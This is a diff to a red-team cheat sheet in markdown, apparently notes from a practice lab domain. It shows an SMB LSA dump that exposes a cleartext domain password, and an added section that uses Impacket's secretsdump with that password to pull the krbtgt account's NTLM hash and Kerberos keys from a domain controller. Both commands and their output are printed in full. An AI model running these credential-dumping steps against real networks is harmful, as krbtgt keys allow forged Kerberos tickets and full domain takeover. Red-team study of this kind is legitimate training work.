@@ -98,9 +98,22 @@ SMB LSA
 	Output: 
 		SMB         192.168.98.30   445    MGMT             			corpmngr@child.warfare.corp:User4&*&*
 
-	
+# Impacket tools
+
+**Install Impacket In kali**
+
+	sudo apt install python3-impacket
+
+**Dumping user Krbtgt**
+
+	impacket-secretsdump -debug child/corpmngr:"User4&*&*"@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'
+
+	Result:
+	[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=child,DC=warfare,DC=corp
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
+	krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
+	krbtgt:aes128-cts-hmac-sha1-96:806d6ea798a9626d3ad00516dd6968b5
+	krbtgt:des-cbc-md5:ba0b49b6b6455885
 
 
-
-# RedTeam-CheckSheet
 # RedTeam-CheckSheet
